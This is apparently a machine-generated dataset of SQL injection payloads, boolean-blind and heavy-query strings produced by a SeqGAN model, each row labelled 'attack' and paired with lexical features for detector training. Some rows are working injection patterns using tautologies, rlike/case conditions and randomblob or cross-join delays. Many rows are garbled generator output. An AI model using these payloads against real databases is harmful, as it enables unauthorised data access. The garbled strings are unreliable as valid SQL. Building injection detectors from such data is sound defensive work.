label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%'""   )    )     =     (    (   ""t'  =  'viveresagexpexpp  (  chrde_message  (  chr  (  'abcdefg',uxpes crdbassisibm.sysib mas as t3  )  -- --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,745,143.0,31.0,3.9276521154940944,67.0,2.0,49.0,25.0,0.46853146853146854,0.013986013986013986,0.34265734265734266,0.17482517482517482,5.0,2.0,4.0,0.0,0.0,2.0,0.0,8.0,1.0,1.0,1.0,6.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1  )   as rdbas as tagotables rs s as t3  )   as rdbles as e2,ral_users ape  (  chr  (    =  ||  (  90,upr  (  randomables s as genh  (  rds as t2,domain.domains sysibm.sys as t2,s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,746,180.0,31.0,3.896658466831,103.0,7.0,53.0,17.0,0.5722222222222222,0.03888888888888889,0.29444444444444445,0.09444444444444444,0.0,0.0,0.0,0.0,0.0,1.0,0.0,7.0,0.0,1.0,4.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,747,73.0,19.0,2.793979712247848,5.0,13.0,40.0,15.0,0.0684931506849315,0.1780821917808219,0.547945205479452,0.2054794520547945,0.0,4.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  ""'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,748,212.0,36.0,4.2834165902116075,106.0,20.0,55.0,31.0,0.5,0.09433962264150944,0.25943396226415094,0.14622641509433962,2.0,4.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,5.0,4.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,8425   )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,749,12.0,7.0,2.4508257945180882,0.0,4.0,5.0,3.0,0.0,0.3333333333333333,0.4166666666666667,0.25,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1  =  "" moall_users ables ele  (  chr  (  randbles as ustables all_users gustables ell_usersys sibm.sat  (  chr  (  chr  (  9660  rles   (  7182  (  69  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,750,158.0,32.0,3.8779353743566625,83.0,11.0,48.0,16.0,0.5253164556962026,0.06962025316455696,0.3037974683544304,0.10126582278481013,0.0,1.0,2.0,0.0,0.0,1.0,0.0,8.0,0.0,3.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,select colt  (  'xcnj'  =  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,751,29.0,14.0,3.3654219428812175,14.0,0.0,9.0,6.0,0.4827586206896552,0.0,0.3103448275862069,0.20689655172413793,2.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,752,73.0,20.0,2.848774232795793,5.0,13.0,40.0,15.0,0.0684931506849315,0.1780821917808219,0.547945205479452,0.2054794520547945,2.0,2.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  ""d",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,753,135.0,28.0,4.030014008068823,67.0,10.0,36.0,22.0,0.4962962962962963,0.07407407407407407,0.26666666666666666,0.16296296296296298,0.0,4.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,5.0,4.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,754,92.0,22.0,3.014506656744198,13.0,13.0,48.0,18.0,0.14130434782608695,0.14130434782608695,0.5217391304347826,0.1956521739130435,4.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,2.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  ""s""  =  ""ki'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,755,159.0,33.0,3.4250477128053336,38.0,15.0,76.0,30.0,0.2389937106918239,0.09433962264150944,0.4779874213836478,0.18867924528301888,4.0,6.0,0.0,1.0,0.0,4.0,0.0,12.0,2.0,0.0,1.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1  )   ablessagexmas rs all_us  (  1,5000000   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,756,58.0,19.0,3.3947420923440434,20.0,9.0,21.0,8.0,0.3448275862068966,0.15517241379310345,0.3620689655172414,0.13793103448275862,0.0,0.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,1.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,757,155.0,34.0,3.927972719070233,56.0,15.0,59.0,25.0,0.36129032258064514,0.0967741935483871,0.38064516129032255,0.16129032258064516,4.0,4.0,0.0,0.0,0.0,2.0,0.0,8.0,2.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,758,107.0,27.0,3.5228911686215136,34.0,13.0,46.0,14.0,0.3177570093457944,0.12149532710280374,0.42990654205607476,0.1308411214953271,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%'  )   and 3202  =  like  (  'a,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,759,33.0,17.0,3.2473344554552277,8.0,5.0,14.0,6.0,0.24242424242424243,0.15151515151515152,0.42424242424242425,0.18181818181818182,2.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,760,63.0,20.0,3.2770305136278552,9.0,13.0,28.0,13.0,0.14285714285714285,0.20634920634920634,0.4444444444444444,0.20634920634920634,0.0,4.0,0.0,0.0,0.0,2.0,0.0,4.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '' mlike  (  90  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,761,154.0,34.0,4.032921058275654,73.0,10.0,50.0,21.0,0.474025974025974,0.06493506493506493,0.3246753246753247,0.13636363636363635,3.0,0.0,2.0,0.0,1.0,1.0,0.0,8.0,1.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ajeepepapere_s_bceive_s_grstkines as ustables abs as rdbles as rdb$tag',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'ibcelall_useras ge  (  69  )   from   (    l 7272  (  3702  )  ,5  )  ||couper  (  select count  (  *  )   from 6414  =  6975 and 8514  ""hf  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,762,415.0,45.0,3.993667708784476,160.0,46.0,162.0,47.0,0.3855421686746988,0.1108433734939759,0.39036144578313253,0.11325301204819277,4.0,1.0,0.0,1.0,1.0,2.0,0.0,28.0,0.0,5.0,2.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'z'  =  'qjn'  =  'llandall_useriessag',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '  =  3814",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,763,272.0,41.0,3.9732489339473127,110.0,22.0,103.0,37.0,0.40441176470588236,0.08088235294117647,0.3786764705882353,0.13602941176470587,8.0,0.0,0.0,1.0,1.0,4.0,0.0,16.0,0.0,1.0,3.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,764,92.0,22.0,3.014506656744198,13.0,13.0,48.0,18.0,0.14130434782608695,0.14130434782608695,0.5217391304347826,0.1956521739130435,4.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,2.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""  )   or 7078  =  like  (  'pnst'  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,765,42.0,21.0,3.4147305173987217,10.0,5.0,18.0,9.0,0.23809523809523808,0.11904761904761904,0.42857142857142855,0.21428571428571427,2.0,1.0,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1  )   apexpghr  (  2367  )  ,null  )   and 8312  7007 3455  =  7007 or 7182o  ,d  ,5  )   from e,d  (  c)"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""a)s  (  '   )    )    or 5903  =    (  ' and    (    (   'bhlx' 3018  =    (  select count  (  hex  (  select coe  (  1 or 8189  =  ans as tons as t2,sysibm.sysibm.sypeas   (  103s_p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,766,412.0,40.0,4.094977862928504,160.0,52.0,148.0,52.0,0.3883495145631068,0.1262135922330097,0.3592233009708738,0.1262135922330097,4.0,2.0,0.0,0.0,1.0,5.0,0.0,23.0,0.0,6.0,9.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,2.0,4.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,767,155.0,34.0,3.927972719070233,56.0,15.0,59.0,25.0,0.36129032258064514,0.0967741935483871,0.38064516129032255,0.16129032258064516,4.0,4.0,0.0,0.0,0.0,2.0,0.0,8.0,2.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%""sfnj"" '   * and    (    (   '%'  =  2223 ortables  (  select conustrke_serall_users (  3020  (  select 5019  =  like  (  8459  =  ""s vkez",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,768,140.0,34.0,4.044476359683073,56.0,17.0,47.0,20.0,0.4,0.12142857142857143,0.3357142857142857,0.14285714285714285,3.0,3.0,0.0,0.0,1.0,3.0,0.0,6.0,2.0,2.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'+  (  select '_database'  )   and    (    (   'agtllllnge_us  (    (       =  1 and  )  ||'qzvzq'  (  'abcdefg',upp_us  (  79  )   and 'qjle'  =  'g'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,769,151.0,29.0,3.6744934653561137,57.0,4.0,59.0,31.0,0.37748344370860926,0.026490066225165563,0.39072847682119205,0.2052980132450331,12.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,0.0,3.0,1.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,770,138.0,30.0,4.033493657696427,75.0,8.0,37.0,18.0,0.5434782608695652,0.057971014492753624,0.26811594202898553,0.13043478260869565,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-4889""   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,771,20.0,7.0,2.223219672335508,0.0,4.0,10.0,6.0,0.0,0.2,0.5,0.3,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,772,92.0,22.0,3.014506656744198,13.0,13.0,48.0,18.0,0.14130434782608695,0.14130434782608695,0.5217391304347826,0.1956521739130435,4.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,2.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '_pipftablds ers ioustables abl",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,773,145.0,34.0,3.972340739320369,61.0,15.0,51.0,18.0,0.4206896551724138,0.10344827586206896,0.35172413793103446,0.12413793103448276,4.0,0.0,0.0,1.0,0.0,1.0,0.0,9.0,1.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,774,133.0,29.0,4.02849050309211,65.0,10.0,36.0,22.0,0.48872180451127817,0.07518796992481203,0.2706766917293233,0.16541353383458646,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,5.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'avvpjippp_pes   )    ssers vq,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,775,151.0,32.0,3.4469898425872274,53.0,13.0,70.0,15.0,0.3509933774834437,0.08609271523178808,0.46357615894039733,0.09933774834437085,2.0,0.0,0.0,0.0,0.0,1.0,0.0,11.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""   )    )      )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,776,28.0,5.0,1.363120568566631,0.0,1.0,20.0,7.0,0.0,0.03571428571428571,0.7142857142857143,0.25,0.0,1.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
